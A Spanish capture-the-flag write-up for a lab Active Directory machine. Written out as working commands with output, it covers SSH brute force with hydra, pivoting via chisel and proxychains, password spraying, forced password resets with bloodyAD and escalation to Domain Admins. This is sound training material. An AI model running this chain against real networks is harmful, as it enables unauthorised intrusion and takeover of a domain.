# The Hackers Labs Company

### Nmap

Al ejecutar `arp-scan` en mi interfaz `eth0` para identificar dispositivos activos dentro de mi red local (`192.168.1.0/24`), descubrí un host adicional con la dirección IP `192.168.1.142.`

<pre class="language-javascript"><code class="lang-javascript">❯ sudo arp-scan -I eth0 --localnet --ignoredups
<strong>
</strong><strong>Interface: eth0, type: EN10MB, MAC: 00:0c:29:be:33:af, IPv4: 192.168.1.140
</strong>192.168.1.142	00:0c:29:64:02:20	(Unknown)
</code></pre>

***

Observamos los puertos abiertos en el Host.

```javascript
❯ sudo nmap -sS -Pn -n -vvv --open --min-rate 5000 192.168.1.142 -oG port

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:64:02:20 (VMware)
```

***

Observamos las versiones y los servicios que corren para cada uno de los puertos.

```rust
❯ nmap -sCV -p22,80 192.168.1.142 -oN target.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 11:19 -0400
Nmap scan report for 192.168.1.142
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: RodCompany
|_http-server-header: Apache/2.4.66 (Debian)
MAC Address: 00:0C:29:64:02:20 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

***

Observamos la web de donde podemos sacar multiples usuarios.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FkDJW8s5y2Ny4IPuhuKjf%2F1.png?alt=media&amp;token=6336b921-e383-4f67-9651-653e25319794" alt=""><figcaption></figcaption></figure>

***

Tenemos una lista de usuarios como estamos en un entorno que sera  AD vamos a hacer permutaciones de usuarios.&#x20;

Le pedi ah CharGPT que me generara solo los formatos (**nombre.apellido**, **inicialapellido**, **nombreapellido**, **apellido**)

```javascript
❯ curl -s http://192.168.1.142/ | grep -oP '(?<=<div class="name">)[^<]+'

Ana Garcia
Carlos Lopez
Maria Torres
Luis Fernandez
Sofia Martinez
Daniel Ruiz
Elena Vega
Marco Silva
```

***

### Cewl

Ya que nigun diccionario tipico funciono, nos creamos uno propio con lo poco que hay en la pagina web.

```javascript
cewl http://192.168.1.142/ > words.txt 
```

***

### Hydra

Con los usuarios permutados y las contraseñas generadas logramos encontrar una contraseña valida para el usuario marco.silva.

```javascript
❯ hydra -L users.txt -P words.txt ssh://192.168.1.142 -t 4
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://192.168.1.142:22/
[22][ssh] host: 192.168.1.141   login: marco.silva   password: **********

```

***

Iniciamos session y observamos que tenemos la primera flag.

```
marco.silva@debian:~$ ls -l
total 4
-rw-rw-r-- 1 marco.silva marco.silva 33 Mar 13 11:47 user.txt
marco.silva@debian:~$ 
```

***

Tengo dos interfaces de red activas **ens33** con IP `192.168.1.142`, que es mi conexión a la red local (tipo casa/lab), y **ens37** con IP `11.11.11.134`, que probablemente es otra red separada (como una red interna básicamente mi máquina está conectada a dos redes al mismo tiempo, lo que me permite escanear o pivotar entre ellas.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FEO0LtTnf7laqCj8Uzs39%2F2.png?alt=media&amp;token=afeba0b1-4be5-4fde-81bf-7f381e8ab112" alt=""><figcaption></figcaption></figure>

***

Este script en **Bash** realiza un **ping sweep** para descubrir qué máquinas están activas en la red **11.11.11.0/24**. Recorre las IPs del **1 al 254**, envía un `ping` con **1 segundo de timeout**, y si el host responde muestra que está **ACTIVE**. Los pings se ejecutan en **paralelo** para que el escaneo sea más rápido y `wait` espera a que todos terminen.&#x20;

```cjs
marco.silva@debian:/dev/shm$ cat live.sh 
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo......\n"
	tput cnorm; exit 1
}

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 11.11.11.$i" &> /dev/null && echo "[+] El host 11.11.11.$i - ACTIVE" &
done; wait

tput cnorm
```

***

El resultado indica que el script encontró **dos máquinas activas en la red**: **11.11.11.135** y **11.11.11.134,** por lo que están **encendidos y accesibles en la red** dentro del rango escaneado (**11.11.11.1–11.11.11.254**). 🚀

```cjs
marco.silva@debian:/dev/shm$ ./live.sh 
[+] El host 11.11.11.135 - ACTIVE
[+] El host 11.11.11.134 - ACTIVE
marco.silva@debian:/dev/shm$ 
```

***

##

## Pivoting

Estoy haciendo ping a `11.11.11.135`  y veo que responde perfectamente (0% de pérdida y tiempos muy bajos), lo que significa que esa máquina está activa dentro de mi red `11.11.11.0/24`; además, el **TTL=128** me sugiere que probablemente es un sistema Windows, así que básicamente ya confirmé conectividad directa y que tengo un posible objetivo accesible en esa red interna.

```cjs
marco.silva@debian:/dev/shm$ ping -c 2 11.11.11.135
PING 11.11.11.135 (11.11.11.135) 56(84) bytes of data.
64 bytes from 11.11.11.135: icmp_seq=1 ttl=128 time=0.848 ms
64 bytes from 11.11.11.135: icmp_seq=2 ttl=128 time=1.05 ms

--- 11.11.11.135 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.848/0.950/1.053/0.102 ms
marco.silva@debian:/dev/shm$ 
```

***

De entrada nos centramos con chisel como servidor, y luego desde la maquina comprometida nos conectamos como cliente.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FbIBqGFElKOELlBJqCVrH%2F3.png?alt=media&amp;token=a20e5ee9-0f45-4dbb-b455-71ee72a226a0" alt=""><figcaption></figcaption></figure>

***

Modificamos el proxychains para poder llegar hasta esa red.

```cjs
❯ cat /etc/proxychains4.conf | tail -n 1
socks5	127.0.0.1 1080
```

***

### NXC

He enumerado el servicio SMB en `11.11.11.135` a través de `proxychains` y veo que es una máquina Windows (Windows 10 / Server 2016) unida al dominio `rodcompany.thl`; además, tiene **SMBv1 activado.**

```abap
❯ proxychains nxc smb 11.11.11.135 -u '' -p '' 2>/dev/null
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-S3VIJV28K8D) (domain:rodcompany.thl) (signing:True) (SMBv1:True)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [+] rodcompany.thl\: 
```

***

Usando el usuario `guest` y he podido hacer **RID brute force**, lo que confirma que hay **enumeración anónima bastante permisiva**; gracias a esto he listado usuarios y grupos del dominio `rodcompany.thl`, incluyendo cuentas interesantes como `jlopez`, `agarcia`, `mrodriguez`, `dfernandez`, `pserrano`, `elena` y `oscar`, además de grupos críticos como **Domain Admins**, **Enterprise Admins** o **DnsAdmins**; esto significa que ya tengo una base sólida para continuar con ataques como password spraying, AS-REP roasting o Kerberoasting, porque ahora conozco usuarios válidos del dominio y la superficie de ataque ha aumentado bastante

```cjs
❯ proxychains nxc smb 11.11.11.135 -u 'guest' -p '' --rid-brute 2>/dev/null
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-S3VIJV28K8D) (domain:rodcompany.thl) (signing:True) (SMBv1:True)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [+] rodcompany.thl\guest: 
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  498: RODCOMPANY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  500: RODCOMPANY\Administrator (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  501: RODCOMPANY\Guest (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  502: RODCOMPANY\krbtgt (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  503: RODCOMPANY\DefaultAccount (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  512: RODCOMPANY\Domain Admins (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  513: RODCOMPANY\Domain Users (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  514: RODCOMPANY\Domain Guests (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  515: RODCOMPANY\Domain Computers (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  516: RODCOMPANY\Domain Controllers (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  517: RODCOMPANY\Cert Publishers (SidTypeAlias)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  518: RODCOMPANY\Schema Admins (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  519: RODCOMPANY\Enterprise Admins (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  520: RODCOMPANY\Group Policy Creator Owners (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  521: RODCOMPANY\Read-only Domain Controllers (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  522: RODCOMPANY\Cloneable Domain Controllers (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  525: RODCOMPANY\Protected Users (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  526: RODCOMPANY\Key Admins (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  527: RODCOMPANY\Enterprise Key Admins (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  553: RODCOMPANY\RAS and IAS Servers (SidTypeAlias)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  571: RODCOMPANY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  572: RODCOMPANY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1000: RODCOMPANY\WIN-S3VIJV28K8D$ (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1101: RODCOMPANY\DnsAdmins (SidTypeAlias)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1102: RODCOMPANY\DnsUpdateProxy (SidTypeGroup)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1104: RODCOMPANY\jlopez (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1105: RODCOMPANY\agarcia (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1106: RODCOMPANY\mrodriguez (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1107: RODCOMPANY\dfernandez (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1108: RODCOMPANY\pserrano (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1111: RODCOMPANY\elena (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1112: RODCOMPANY\oscar (SidTypeUser)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  1113: RODCOMPANY\RRHH (SidTypeGroup)
```

***

Los **roles de los usuarios** obtenidos anteriormente en la web pueden ayudarcomo **posibles contraseñas** para probar en **Active Directory**.&#x20;

En este entorno sabemos que las contraseñas deben incluir **al menos un carácter especial**, y el carácter `/` es uno de ellos. Por eso vamos a realizar un **password spraying contra el AD**.

```abap
❯ curl -s http://192.168.1.142 | grep -oP '(?<=<div class="role">)[^<]+'

UX/Designer
Backend/Developer
Project/Manager
DevOps/Engineer
Frontend/Developer
Security/Analyst
Marketing/Specialist
Data/Scientist
```

***

### Password Spray

He realizado password spraying y, aunque la mayoría de intentos fallan, he identificado que el usuario `elena` tiene como contraseña `DevOps/Engineer`, ya que el mensaje `STATUS_PASSWORD_MUST_CHANGE` indica que las credenciales son correctas pero requieren cambio, lo que significa que he encontrado acceso válido y ahora puedo intentar autenticarme por otros servicios, cambiar la contraseña o usar esta cuenta como punto de entrada para seguir enumerando y escalando dentro del dominio.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FJnDfum1sUP0avTla7Ydp%2F4.png?alt=media&amp;token=3f5b5383-f737-47d0-84cb-5f4994b5edbf" alt=""><figcaption></figcaption></figure>

***

Aprovechando que la cuenta `elena` tenía la contraseña correcta pero expirada para cambiarla usando `impacket-changepasswd`, lo que confirma que podía autenticarme y ahora tengo control total de la cuenta con la nueva contraseña `RdCompany!2025.`

```abap
❯ proxychains impacket-changepasswd rodcompany.thl/elena:'DevOps/Engineer'@11.11.11.135 -newpass 'RdCompany!2025'

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of rodcompany.thl\elena
[*] Connecting to DCE/RPC as rodcompany.thl\elena
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:445  ...  OK
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:445  ...  OK
[*] Password was changed successfully.
```

***

He validado las nuevas credenciales de `elena` (`RdCompany!2025`) contra SMB y ahora sí obtengo un `[+]`, lo que confirma que tengo acceso autenticado real al sistema dentro del dominio `rodcompany.thl.`

```abap
❯ proxychains nxc smb 11.11.11.135 -u 'elena' -p 'RdCompany!2025' 2>/dev/null
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-S3VIJV28K8D) (domain:rodcompany.thl) (signing:True) (SMBv1:True)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [+] rodcompany.thl\elena:RdCompany!2025 
```

***

### LdapDump

He utilizado las credenciales válidas de `elena` para hacer un `ldapdomaindump` , lo que significa que ahora tengo un volcado completo del Active Directory (usuarios, grupos, equipos, políticas, etc.), permitiéndome analizar offline toda la estructura del dominio en busca de relaciones, privilegios mal configurados o vectores de escalada para avanzar hacia privilegios más altos.

```abap
❯ proxychains ldapdomaindump  -u 'rodcompany.thl\elena' -p 'RdCompany!2025' 11.11.11.135 -o dump
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[*] Connecting to host...
[*] Binding to host
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Ninguno de los usuarios ni menos el que controlamos pertenece al remote asi que no nos podemos conectar.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FzAaWs1Zb86tgFbhnvVys%2F4.png?alt=media&amp;token=c96a8b01-af47-4811-b8ff-16436820eae2" alt=""><figcaption></figcaption></figure>

***

BloodHound (PRIORIDAD MÁXIMA)

He ejecutado BloodHound correctamente he obtenido el ZIP con toda la información del dominio y ahora el paso clave es importarlo en BloodHound para analizar las relaciones y encontrar el camino más corto desde mi usuario `elena` hacia privilegios altos como Domain Admin.

```abap
❯ proxychains bloodhound-python -u elena -p 'RdCompany!2025' -d rodcompany.thl -dc WIN-S3VIJV28K8D.rodcompany.thl -ns 11.11.11.135 -c All --zip --dns-tcp
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:53  ...  OK
INFO: Found AD domain: rodcompany.thl
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:53  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:53  ...  OK
INFO: Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.132:88 <--socket error or timeout!
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (WIN-S3VIJV28K8D.rodcompany.thl:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: WIN-S3VIJV28K8D.rodcompany.thl
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:53  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:53  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-S3VIJV28K8D.rodcompany.thl
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
INFO: Found 12 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-S3VIJV28K8D.rodcompany.thl
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:445  ...  OK
INFO: Done in 00M 01S
INFO: Compressing output into 20260317114729_bloodhound.zip
```

***

OK ahora si nos abrimos el ZIP que generamos en Blooo observamos que el camino mas corto para llegarnos hacer con el administrador es atravez del usario oscar, como?.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2F4WDX1LPI2WKr2DSLAUoB%2F5.png?alt=media&amp;token=2b7b1a63-c257-455d-b8b7-674191fad047" alt=""><figcaption></figcaption></figure>

***

De entrada controlamos un usuario elena, que elena tiene el derecho de cambiarle la contraseña tanto al usuario DFERNANDEZ como tambien al usuario OSCAR, la idea parte de hacernos con el control del usuario oscar.

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2Frzr7zXGKmg1tukfuGKQG%2F4.png?alt=media&amp;token=5106b61d-7f03-4278-8469-af461dca8007" alt=""><figcaption></figcaption></figure>

***

### BloodyAD

He abusado de los permisos de mi usuario `elena` en el dominio para cambiar la contraseña del usuario `oscar` sin conocer la anterior,  porque tengo privilegios como `ForceChangePassword`  sobre esa cuenta, permitiéndome comprometer otro usuario y avanzar lateralmente dentro del Active Directory, lo que puede acercarme a privilegios más altos dependiendo de los permisos que tenga `oscar`.

```abap
❯ proxychains bloodyAD --host 11.11.11.135 -d rodcompany.thl -u elena -p 'RdCompany!2025' set password oscar 'Password@1'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[+] Password changed successfully!
```

***

### Verificar

Las credenciales `oscar:Password@1`. El resultado muestra autenticación exitosa en el dominio `rodcompany.thl`, confirmando que las credenciales funcionan.

```cjs
❯ proxychains nxc smb 11.11.11.135 -u 'oscar' -p 'Password@1' 2>/dev/null
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-S3VIJV28K8D) (domain:rodcompany.thl) (signing:True) (SMBv1:True)
SMB         11.11.11.135    445    WIN-S3VIJV28K8D  [+] rodcompany.thl\oscar:Password@1 
```

***

He usado las credenciales comprometidas de `oscar` para añadirme al grupo `RRHH.`

```cjs
❯ proxychains bloodyAD --host 11.11.11.135 -d rodcompany.thl -u oscar -p 'Password@1' add groupMember "RRHH" "oscar"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[+] oscar added to RRHH
```

***

He utilizado la cuenta comprometida de `oscar` para añadirme primero al grupo `RRHH`, aprovechando los permisos que tenía sobre la gestión de membresías, y a partir de ahí he abusado de esa relación de delegación para escalar aún más y añadirme directamente al grupo **Domain Admins**,

```cjs
❯ proxychains bloodyAD --host 11.11.11.135 -d rodcompany.thl -u oscar -p 'Password@1' add groupMember "Domain Admins" "oscar"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  11.11.11.135:389  ...  OK
[+] oscar added to Domain Admins
```

***

Si tu usuario es miembro de **Domain Admins**, normalmente puedes conectarte por **WinRM** usando **Evil-WinRM**, ya que los administradores del dominio suelen tener permisos administrativos en los equipos del dominio.

Tambien tenemos privilegios suficientes para **extraer hashes de credenciales del dominio**. Con la herramienta **secretsdump.py** para realizar un **DCSync** contra **Active Directory.**

**Maquina resuelta**

<figure><img src="https://1827363921-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FEGJvvgIusdsLKeoExX1C%2Fuploads%2FMDFcfmi9IevI0MpqkHE9%2F6.png?alt=media&amp;token=146acf3f-43d6-4b36-8529-9e987fc75b4a" alt=""><figcaption></figcaption></figure>
